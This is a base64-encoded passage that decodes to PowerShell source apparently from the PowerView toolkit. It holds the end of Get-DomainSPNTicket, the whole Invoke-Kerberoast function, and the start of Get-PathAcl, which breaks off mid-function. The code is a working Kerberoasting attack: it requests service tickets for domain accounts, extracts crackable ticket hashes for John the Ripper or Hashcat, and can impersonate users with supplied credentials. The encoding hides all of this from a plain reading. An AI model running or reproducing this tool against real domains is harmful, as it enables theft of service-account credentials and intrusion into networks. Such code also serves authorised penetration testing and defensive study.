CiAgICAgICAgICAgICAgICAkVXNlclNQTiA9ICRPYmplY3QKICAgICAgICAgICAgICAgICRTYW1BY2NvdW50TmFtZSA9ICdVTktOT1dOJwogICAgICAgICAgICAgICAgJERpc3Rpbmd1aXNoZWROYW1lID0gJ1VOS05PV04nCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICMgaWYgYSB1c2VyIGhhcyBtdWx0aXBsZSBTUE5zIHdlIG9ubHkgdGFrZSB0aGUgZmlyc3Qgb25lIG90aGVyd2lzZSB0aGUgc2VydmljZSB0aWNrZXQgcmVxdWVzdCBmYWlscyBtaXNlcmFibHkgOikgLUBzdDNyMzBieXQzCiAgICAgICAgICAgIGlmICgkVXNlclNQTiAtaXMgW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5SZXN1bHRQcm9wZXJ0eVZhbHVlQ29sbGVjdGlvbl0pIHsKICAgICAgICAgICAgICAgICRVc2VyU1BOID0gJFVzZXJTUE5bMF0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICRUaWNrZXQgPSBOZXctT2JqZWN0IFN5c3RlbS5JZGVudGl0eU1vZGVsLlRva2Vucy5LZXJiZXJvc1JlcXVlc3RvclNlY3VyaXR5VG9rZW4gLUFyZ3VtZW50TGlzdCAkVXNlclNQTgogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtRG9tYWluU1BOVGlja2V0XSBFcnJvciByZXF1ZXN0aW5nIHRpY2tldCBmb3IgU1BOICckVXNlclNQTicgZnJvbSB1c2VyICckRGlzdGluZ3Vpc2hlZE5hbWUnIDogJF8iCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRUaWNrZXQpIHsKICAgICAgICAgICAgICAgICRUaWNrZXRCeXRlU3RyZWFtID0gJFRpY2tldC5HZXRSZXF1ZXN0KCkKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFRpY2tldEJ5dGVTdHJlYW0pIHsKICAgICAgICAgICAgICAgICRUaWNrZXRIZXhTdHJlYW0gPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRUaWNrZXRCeXRlU3RyZWFtKSAtcmVwbGFjZSAnLScKICAgICAgICAgICAgICAgIFtTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0XSRQYXJ0cyA9ICgkVGlja2V0SGV4U3RyZWFtIC1yZXBsYWNlICdeKC4qPykwNDgyMC4uLiguKiknLCckMicpIC1TcGxpdCAnQTQ4MjAxJwogICAgICAgICAgICAgICAgJFBhcnRzLlJlbW92ZUF0KCRQYXJ0cy5Db3VudCAtIDEpCiAgICAgICAgICAgICAgICAkSGFzaCA9ICRQYXJ0cyAtam9pbiAnQTQ4MjAxJwogICAgICAgICAgICAgICAgJEhhc2ggPSAkSGFzaC5JbnNlcnQoMzIsICckJykKCiAgICAgICAgICAgICAgICAkT3V0ID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdTYW1BY2NvdW50TmFtZScgJFNhbUFjY291bnROYW1lCiAgICAgICAgICAgICAgICAkT3V0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0Rpc3Rpbmd1aXNoZWROYW1lJyAkRGlzdGluZ3Vpc2hlZE5hbWUKICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnU2VydmljZVByaW5jaXBhbE5hbWUnICRUaWNrZXQuU2VydmljZVByaW5jaXBhbE5hbWUKCiAgICAgICAgICAgICAgICBpZiAoJE91dHB1dEZvcm1hdCAtbWF0Y2ggJ0pvaG4nKSB7CiAgICAgICAgICAgICAgICAgICAgJEhhc2hGb3JtYXQgPSAiYCRrcmI1dGdzYCQkKCRUaWNrZXQuU2VydmljZVByaW5jaXBhbE5hbWUpOiRIYXNoIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCREaXN0aW5ndWlzaGVkTmFtZSAtbmUgJ1VOS05PV04nKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyRG9tYWluID0gJERpc3Rpbmd1aXNoZWROYW1lLlN1YlN0cmluZygkRGlzdGluZ3Vpc2hlZE5hbWUuSW5kZXhPZignREM9JykpIC1yZXBsYWNlICdEQz0nLCcnIC1yZXBsYWNlICcsJywnLicKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyRG9tYWluID0gJ1VOS05PV04nCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAjIGhhc2hjYXQgb3V0cHV0IGZvcm1hdAogICAgICAgICAgICAgICAgICAgICRIYXNoRm9ybWF0ID0gImAka3JiNXRnc2AkMjNgJCokU2FtQWNjb3VudE5hbWVgJCRVc2VyRG9tYWluYCQkKCRUaWNrZXQuU2VydmljZVByaW5jaXBhbE5hbWUpKmAkJEhhc2giCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkT3V0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0hhc2gnICRIYXNoRm9ybWF0CiAgICAgICAgICAgICAgICAkT3V0LlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5TUE5UaWNrZXQnKQogICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICRPdXQKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBFTkQgewogICAgICAgIGlmICgkTG9nb25Ub2tlbikgewogICAgICAgICAgICBJbnZva2UtUmV2ZXJ0VG9TZWxmIC1Ub2tlbkhhbmRsZSAkTG9nb25Ub2tlbgogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEludm9rZS1LZXJiZXJvYXN0IHsKPCMKLlNZTk9QU0lTCgpSZXF1ZXN0cyBzZXJ2aWNlIHRpY2tldHMgZm9yIGtlcmJlcm9hc3QtYWJsZSBhY2NvdW50cyBhbmQgcmV0dXJucyBleHRyYWN0ZWQgdGlja2V0IGhhc2hlcy4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSwgQG1hY2hvc2VjICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBJbnZva2UtVXNlckltcGVyc29uYXRpb24sIEludm9rZS1SZXZlcnRUb1NlbGYsIEdldC1Eb21haW5Vc2VyLCBHZXQtRG9tYWluU1BOVGlja2V0ICAKCi5ERVNDUklQVElPTgoKVXNlcyBHZXQtRG9tYWluVXNlciB0byBxdWVyeSBmb3IgdXNlciBhY2NvdW50cyB3aXRoIG5vbi1udWxsIHNlcnZpY2UgcHJpbmNpcGxlCm5hbWVzIChTUE5zKSBhbmQgdXNlcyBHZXQtU1BOVGlja2V0IHRvIHJlcXVlc3QvZXh0cmFjdCB0aGUgY3JhY2thYmxlIHRpY2tldCBpbmZvcm1hdGlvbi4KVGhlIHRpY2tldCBmb3JtYXQgY2FuIGJlIHNwZWNpZmllZCB3aXRoIC1PdXRwdXRGb3JtYXQgPEpvaG4vSGFzaGNhdD4uCgouUEFSQU1FVEVSIElkZW50aXR5CgpBIFNhbUFjY291bnROYW1lIChlLmcuIGhhcm1qMHkpLCBEaXN0aW5ndWlzaGVkTmFtZSAoZS5nLiBDTj1oYXJtajB5LENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwpLApTSUQgKGUuZy4gUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMTA4KSwgb3IgR1VJRCAoZS5nLiA0YzQzNWRkNy1kYzU4LTRiMTQtOWE1ZS0xZmRiMGU4MGQyMDEpLgpXaWxkY2FyZHMgYWNjZXB0ZWQuCgouUEFSQU1FVEVSIERvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gdXNlIGZvciB0aGUgcXVlcnksIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgTERBUEZpbHRlcgoKU3BlY2lmaWVzIGFuIExEQVAgcXVlcnkgc3RyaW5nIHRoYXQgaXMgdXNlZCB0byBmaWx0ZXIgQWN0aXZlIERpcmVjdG9yeSBvYmplY3RzLgoKLlBBUkFNRVRFUiBTZWFyY2hCYXNlCgpUaGUgTERBUCBzb3VyY2UgdG8gc2VhcmNoIHRocm91Z2gsIGUuZy4gIkxEQVA6Ly9PVT1zZWNyZXQsREM9dGVzdGxhYixEQz1sb2NhbCIKVXNlZnVsIGZvciBPVSBxdWVyaWVzLgoKLlBBUkFNRVRFUiBTZXJ2ZXIKClNwZWNpZmllcyBhbiBBY3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRvIGJpbmQgdG8uCgouUEFSQU1FVEVSIFNlYXJjaFNjb3BlCgpTcGVjaWZpZXMgdGhlIHNjb3BlIHRvIHNlYXJjaCB1bmRlciwgQmFzZS9PbmVMZXZlbC9TdWJ0cmVlIChkZWZhdWx0IG9mIFN1YnRyZWUpLgoKLlBBUkFNRVRFUiBSZXN1bHRQYWdlU2l6ZQoKU3BlY2lmaWVzIHRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVyIG9iamVjdC4KCi5QQVJBTUVURVIgU2VydmVyVGltZUxpbWl0CgpTcGVjaWZpZXMgdGhlIG1heGltdW0gYW1vdW50IG9mIHRpbWUgdGhlIHNlcnZlciBzcGVuZHMgc2VhcmNoaW5nLiBEZWZhdWx0IG9mIDEyMCBzZWNvbmRzLgoKLlBBUkFNRVRFUiBUb21ic3RvbmUKClN3aXRjaC4gU3BlY2lmaWVzIHRoYXQgdGhlIHNlYXJjaGVyIHNob3VsZCBhbHNvIHJldHVybiBkZWxldGVkL3RvbWJzdG9uZWQgb2JqZWN0cy4KCi5QQVJBTUVURVIgT3V0cHV0Rm9ybWF0CgpFaXRoZXIgJ0pvaG4nIGZvciBKb2huIHRoZSBSaXBwZXIgc3R5bGUgaGFzaCBmb3JtYXR0aW5nLCBvciAnSGFzaGNhdCcgZm9yIEhhc2hjYXQgZm9ybWF0LgpEZWZhdWx0cyB0byAnSm9obicuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouRVhBTVBMRQoKSW52b2tlLUtlcmJlcm9hc3QgfCBmbAoKS2VyYmVyb2FzdHMgYWxsIGZvdW5kIFNQTnMgZm9yIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5FWEFNUExFCgpJbnZva2UtS2VyYmVyb2FzdCAtRG9tYWluIGRldi50ZXN0bGFiLmxvY2FsIC1PdXRwdXRGb3JtYXQgSGFzaENhdCB8IGZsCgpLZXJiZXJvYXN0cyBhbGwgZm91bmQgU1BOcyBmb3IgdGhlIHRlc3RsYWIubG9jYWwgZG9tYWluLCBvdXRwdXR0aW5nIHRvIEhhc2hDYXQKZm9ybWF0IGluc3RlYWQgb2YgSm9obiAodGhlIGRlZmF1bHQpLgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1vcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpJbnZva2UtS2VyYmVyb2FzdCAtQ3JlZGVudGlhbCAkQ3JlZCAtVmVyYm9zZSAtRG9tYWluIHRlc3RsYWIubG9jYWwgfCBmbAoKS2VyYmVyb2FzdHMgYWxsIGZvdW5kIFNQTnMgZm9yIHRoZSB0ZXN0bGFiLmxvY2FsIGRvbWFpbiB1c2luZyBhbHRlcm5hdGUgY3JlZGVudGlhbHMuCgouT1VUUFVUUwoKUG93ZXJWaWV3LlNQTlRpY2tldAoKT3V0cHV0cyBhIGN1c3RvbSBvYmplY3QgY29udGFpbmluZyB0aGUgU2FtQWNjb3VudE5hbWUsIFNlcnZpY2VQcmluY2lwYWxOYW1lLCBhbmQgZW5jcnlwdGVkIHRpY2tldCBzZWN0aW9uLgojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LlNQTlRpY2tldCcpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnRGlzdGluZ3Vpc2hlZE5hbWUnLCAnU2FtQWNjb3VudE5hbWUnLCAnTmFtZScsICdNZW1iZXJEaXN0aW5ndWlzaGVkTmFtZScsICdNZW1iZXJOYW1lJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRJZGVudGl0eSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdKb2huJywgJ0hhc2hjYXQnKV0KICAgICAgICBbQWxpYXMoJ0Zvcm1hdCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE91dHB1dEZvcm1hdCA9ICdKb2huJywKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgQkVHSU4gewogICAgICAgICRVc2VyU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnU1BOJyA9ICRUcnVlCiAgICAgICAgICAgICdQcm9wZXJ0aWVzJyA9ICdzYW1hY2NvdW50bmFtZSxkaXN0aW5ndWlzaGVkbmFtZSxzZXJ2aWNlcHJpbmNpcGFsbmFtZScKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydMREFQRmlsdGVyJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snTERBUEZpbHRlciddID0gJExEQVBGaWx0ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CgogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICAkTG9nb25Ub2tlbiA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydJZGVudGl0eSddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ0lkZW50aXR5J10gPSAkSWRlbnRpdHkgfQogICAgICAgIEdldC1Eb21haW5Vc2VyIEBVc2VyU2VhcmNoZXJBcmd1bWVudHMgfCBXaGVyZS1PYmplY3QgeyRfLnNhbWFjY291bnRuYW1lIC1uZSAna3JidGd0J30gfCBHZXQtRG9tYWluU1BOVGlja2V0IC1PdXRwdXRGb3JtYXQgJE91dHB1dEZvcm1hdAogICAgfQoKICAgIEVORCB7CiAgICAgICAgaWYgKCRMb2dvblRva2VuKSB7CiAgICAgICAgICAgIEludm9rZS1SZXZlcnRUb1NlbGYgLVRva2VuSGFuZGxlICRMb2dvblRva2VuCiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gR2V0LVBhdGhBY2wgewo8IwouU1lOT1BTSVMKCkVudW1lcmF0ZXMgdGhlIEFDTCBmb3IgYSBnaXZlbiBmaWxlIHBhdGguCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEFkZC1SZW1vdGVDb25uZWN0aW9uLCBSZW1vdmUtUmVtb3RlQ29ubmVjdGlvbiwgQ29udmVydEZyb20tU0lEICAKCi5ERVNDUklQVElPTgoKRW51bWVyYXRlcyB0aGUgQUNMIGZvciBhIHNwZWNpZmllZCBmaWxlL2ZvbGRlciBwYXRoLCBhbmQgdHJhbnNsYXRlcwp0aGUgYWNjZXNzIHJ1bGVzIGZvciBlYWNoIGVudHJ5IGludG8gcmVhZGFibGUgZm9ybWF0cy4gSWYgLUNyZWRlbnRpYWwgaXMgcGFzc2VkLApBZGQtUmVtb3RlQ29ubmVjdGlvbi9SZW1vdmUtUmVtb3RlQ29ubmVjdGlvbiBpcyB1c2VkIHRvIHRlbXBvcmFyaWx5IG1hcCB0aGUgcmVtb3RlIHNoYXJlLgoKLlBBUkFNRVRFUiBQYXRoCgpTcGVjaWZpZXMgdGhlIGxvY2FsIG9yIHJlbW90ZSBwYXRoIHRvIGVudW1lcmF0ZSB0aGUgQUNMcyBmb3IuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBwYXRoLgoKLkVYQU1QTEUKCkdldC1QYXRoQWNsICJcXFNFUlZFUlxTaGFyZVwiCgpSZXR1cm5zIEFDTHMgZm9yIHRoZSBnaXZlbiBVTkMgc2hhcmUuCgouRVhBTVBMRQoKZ2NpIC5cdGVzdC50eHQgfCBHZXQtUGF0aEFjbAoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtJywgJFNlY1Bhc3N3b3JkKQpHZXQtUGF0aEFjbCAtUGF0aCAiXFxTRVJWRVJcU2hhcmVcIiAtQ3JlZGVudGlhbCAkQ3JlZAoKLklOUFVUUwoKU3RyaW5nCgpPbmUgb2YgbW9yZSBwYXRocyB0byBlbnVtZXJhdGUgQUNMcyBmb3IuCgouT1VUUFVUUwoKUG93ZXJWaWV3LkZpbGVBQ0wKCkEgY3VzdG9tIG9iamVjdCB3aXRoIHRoZSBmdWxsIHBhdGggYW5kIGFzc29jaWF0ZWQgQUNMIGVudHJpZXMuCgouTElOSwoKaHR0cHM6Ly9zdXBwb3J0Lm1pY3Jvc29mdC5jb20vZW4tdXMva2IvMzA1MTQ0CiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuRmlsZUFDTCcpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdGdWxsTmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUGF0aCwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgQkVHSU4gewoKICAgICAgICBmdW5jdGlvbiBDb252ZXJ0LUZpbGVSaWdodCB7CiAgICAgICAgICAgICMgRnJvbSBBbnNnYXIgV2llY2hlcnMgYXQgaHR0cDovL3N0YWNrb3ZlcmZsb3cuY29tL3F1ZXN0aW9ucy8yODAyOTg3Mi9yZXRyaWV2aW5nLXNlY3VyaXR5LWRlc2NyaXB0b3ItYW5kLWdldHRpbmctbnVtYmVyLWZvci1maWxlc3lzdGVtcmlnaHRzCiAgICAgICAgICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICAgICAgICAgIFBhcmFtKAogICAgICAgICAgICAgICAgW0ludF0KICAgICAgICAgICAgICAgICRGU1IKICAgICAgICAgICAgKQoKICAgICAgICAgICAgJEFjY2Vzc01hc2sgPSBAewogICAgICAgICAgICAgICAgW3VpbnQzMl0nMHg4MDAwMDAwMCcgPSAnR2VuZXJpY1JlYWQnCiAgICAgICAgICAgICAgICBbdWludDMyXScweDQwMDAwMDAwJyA9ICdHZW5lcmljV3JpdGUnCiAgICAgICAgICAgICAgICBbdWludDMyXScweDIwMDAwMDAwJyA9ICdHZW5lcmljRXhlY3V0ZScKICAgICAgICAgICAgICAgIFt1aW50MzJdJzB4MTAwMDAwMDAnID0gJ0dlbmVyaWNBbGwnCiAgICAgICAgICAgICAgICBbdWludDMyXScweDAyMDAwMDAwJyA9ICdNYXhpbXVtQWxsb3dlZCcKICAgICAgICAgICAgICAgIFt1aW50MzJdJzB4MDEwMDAwMDAnID0gJ0FjY2Vzc1N5c3RlbVNlY3VyaXR5JwogICAgICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDEwMDAwMCcgPSAnU3luY2hyb25pemUnCiAgICAgICAgICAgICAgICBbdWludDMyXScweDAwMDgwMDAwJyA9ICdXcml0ZU93bmVyJwogICAgICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDA0MDAwMCcgPSAnV3JpdGVEQUMnCiAgICAgICAgICAgICAgICBbdWludDMyXScweDAwMDIwMDAwJyA9ICdSZWFkQ29udHJvbCcKICAgICAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMTAwMDAnID0gJ0RlbGV0ZScKICAgICAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMDAxMDAnID0gJ1dyaXRlQXR0cmlidXRlcycKICAgICAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMDAwODAnID0gJ1JlYWRBdHRyaWJ1dGVzJwogICAgICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDA0MCcgPSAnRGVsZXRlQ2hpbGQnCiAgICAgICAgICAgICAgICBbdWludDMyXScweDAwMDAwMDIwJyA9ICdFeGVjdXRlL1RyYXZlcnNlJwogICAgICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDAxMCcgPSAnV3JpdGVFeHRlbmRlZEF0dHJpYnV0ZXMnCiAgICAgICAgICAgICAgICBbdWludDMyXScweDAwMDAwMDA4JyA9ICdSZWFkRXh0ZW5kZWRBdHRyaWJ1dGVzJwogICAgICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDAwNCcgPSAnQXBwZW5kRGF0YS9BZGRTdWJkaXJlY3RvcnknCiAgICAgICAgICAgICAgICBbdWludDMyXScweDAwMDAwMDAyJyA9ICdXcml0ZURhdGEvQWRkRmlsZScKICAgICAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMDAwMDEnID0gJ1JlYWREYXRhL0xpc3REaXJlY3RvcnknCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRTaW1wbGVQZXJtaXNzaW9ucyA9IEB7CiAgICAgICAgICAgICAgICBbdWludDMyXScweDFmMDFmZicgPSAnRnVsbENvbnRyb2wnCiAgICAgICAgICAgICAgICBbdWludDMyXScweDAzMDFiZicgPSAnTW9kaWZ5JwogICAgICAgICAgICAgICAgW3VpbnQzMl0nMHgwMjAwYTknID0gJ1JlYWRBbmRFeGVjdXRlJwogICAgICAgICAgICAgICAgW3VpbnQzMl0nMHgwMjAxOWYnID0gJ1JlYWRBbmRXcml0ZScKICAgICAgICAgICAgICAgIFt1aW50MzJdJzB4MDIwMDg5JyA9ICdSZWFkJwogICAgICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAxMTYnID0gJ1dyaXRlJwogICAgICAgICAgICB9CgogICAgICAgICAgICAkUGVybWlzc2lvbnMgPSBAKCkKCiAgICAgICAgICAgICMgZ2V0IHNpbXBsZSBwZXJtaXNzaW9uCiAgICAgICAgICAgICRQZXJtaXNzaW9ucyArPSAkU2ltcGxlUGVybWlzc2lvbnMuS2V5cyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCgkRlNSIC1iYW5kICRfKSAtZXEgJF8pIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU2ltcGxlUGVybWlzc2lvbnNbJF9dCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZTUiA9ICRGU1IgLWJhbmQgKC1ub3QgJF8pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAg